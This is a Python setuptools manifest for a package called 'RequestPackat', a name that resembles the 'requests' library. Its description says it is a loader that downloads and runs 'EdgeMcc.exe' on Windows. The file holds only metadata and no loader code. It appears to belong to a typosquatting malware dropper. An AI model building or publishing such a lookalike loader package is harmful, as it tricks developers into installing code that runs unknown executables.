from setuptools import setup, find_packages

setup(
    name='RequestPackat',
    version='1.0.1',
    description='A loader that downloads and runs EdgeMcc.exe',
    author='Packed',
    author_email='oelfaesraali@gmail.com',
    packages=find_packages(),
    install_requires=['requests'],
    classifiers=[
        'Programming Language :: Python :: 3',
        'Operating System :: Microsoft :: Windows',
    ],
    python_requires='>=3.6',
)
